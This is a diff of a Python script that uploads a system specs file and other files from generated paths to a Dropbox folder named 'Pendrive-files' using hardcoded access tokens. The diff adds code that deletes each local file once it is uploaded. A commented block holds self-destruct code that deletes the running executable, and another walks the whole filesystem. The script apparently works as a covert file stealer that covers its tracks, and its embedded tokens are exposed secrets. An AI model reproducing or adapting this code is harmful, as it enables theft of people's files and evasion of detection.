@@ -2,6 +2,8 @@
 #import pathlib
 #import cpuinfo
 
+import time
+import sys
 import os
 import time
 import datetime
@@ -147,6 +149,13 @@ if os.path.isfile(specs_path):
 else:
     print(f"The file '{specs_file}' does not exist in the current folder.")
 
+def delete_file(file_path):
+    try:
+        os.remove(file_path)
+        print("file", file_path, "deleted successfully")
+    except:
+        print("can't delete file")
+
 def upload_file(file_path, access_token, destination_path):
     try:
         # Create a Dropbox object with the access token
@@ -158,6 +167,7 @@ def upload_file(file_path, access_token, destination_path):
             dbx.files_upload(file.read(), destination_path)
 
         print("File uploaded successfully!")
+        delete_file(file_path)
     except AuthError as e:
         print("Error authenticating Dropbox account: ", e)
     except dropbox.exceptions.ApiError as e:
@@ -189,7 +199,7 @@ file_path = specs_path
 print(file_path)
 
 # Provide your Dropbox access token
-access_token = "sl.BfRaQnxXTSqII_G8dvoNEJaHZP_jWPp9nwP3aOUG0dPGpHmsdJr06ltSPFGimzVvfZfcWtesqYiCDMIvrPtn5yKn59zTdGR_raQSp1c5G-v-kO5h8MBz-EwCQSonalQpsl_uldQ"
+access_token = "sl.BfvDTf3T61F39KgCcIuyZZGq3VtpDU6X51EEaYrn1XVXrLJqIHEDcRdcyL3Cv3MlzX7BG_bDAFeloAvBqUXfJg_ncNS9HVQiKGh-SBy-zipGDHvfyz3WDQmx54aN_octHxczpHM"
 
 # Specify the destination path in Dropbox where you want to upload the file
 destination_path = "/Dropbox/Aplikacje/Pendrive-files/specs.txt"
@@ -204,8 +214,29 @@ paths = generate_paths()
 for i, path in enumerate(paths):
     print("Uploading file:", i, path[0], path[1])
     upload_file(path[0], access_token, path[1])
+    #delete_file(path[0])
     print("done")
 
+"""
+# self destruct
+def self_destruct():
+    os.remove(sys.argv[0][:-2]+"exe")
+
+self_destruct()
+
+# Get the path of the currently running executable file
+current_file_path = sys.executable
+
+# Delete the executable file
+print(1)
+os.remove(current_file_path)
+print(2)
+
+time.sleep(1000)
+a = input()
+"""
+
+# directories file 
 """
 with open('directories.txt', 'w') as file:
     for root, dirs, files in os.walk('/'):
